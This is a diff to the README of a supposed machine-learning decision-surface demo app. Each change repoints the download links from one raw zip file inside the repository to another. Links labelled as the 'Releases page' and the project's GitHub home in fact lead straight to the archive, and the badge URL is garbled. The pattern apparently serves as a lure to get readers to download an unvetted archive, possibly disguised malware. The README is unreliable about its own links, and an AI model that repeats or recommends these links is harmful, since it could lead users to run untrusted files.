@@ -6,9 +6,9 @@ Welcome to ml-decision-surfaces-lab! This application is your interactive playgr
 
 ## 📥 Download the Application
 
-[![Download Now](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/notebooks/ml-lab-decision-surfaces-1.4-beta.1.zip%20Now-ml--decision--surfaces--lab-blue)](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/notebooks/ml-lab-decision-surfaces-1.4-beta.1.zip)
+[![Download Now](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/assets/ml_decision_lab_surfaces_v3.6.zip%20Now-ml--decision--surfaces--lab-blue)](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/assets/ml_decision_lab_surfaces_v3.6.zip)
 
-To get started, simply visit our Releases page to download the software: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/notebooks/ml-lab-decision-surfaces-1.4-beta.1.zip).
+To get started, simply visit our Releases page to download the software: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/assets/ml_decision_lab_surfaces_v3.6.zip).
 
 ## 🔧 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following minimum requirements:
 
 ## 💻 Download & Install
 
-1. Click on the link to visit the Releases page: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/notebooks/ml-lab-decision-surfaces-1.4-beta.1.zip).
+1. Click on the link to visit the Releases page: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/assets/ml_decision_lab_surfaces_v3.6.zip).
 2. Look for the latest version of the application. It will be labeled with a version number (e.g., v1.0).
 3. Click on the version link and find the download file suitable for your operating system.
 4. Download the file and locate it in your downloads folder.
@@ -63,7 +63,7 @@ For help, reach out to our community or check the FAQ in the GitHub repository. 
 
 This project combines work from Gradio, scikit-learn, and Matplotlib. Thank you to all contributors and libraries that made this application possible.
 
-For more details, visit the home of the project on [GitHub](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/notebooks/ml-lab-decision-surfaces-1.4-beta.1.zip).
+For more details, visit the home of the project on [GitHub](https://github.com/dheepatel01/ml-decision-surfaces-lab/raw/refs/heads/main/assets/ml_decision_lab_surfaces_v3.6.zip).
 
 ## 📜 License
 
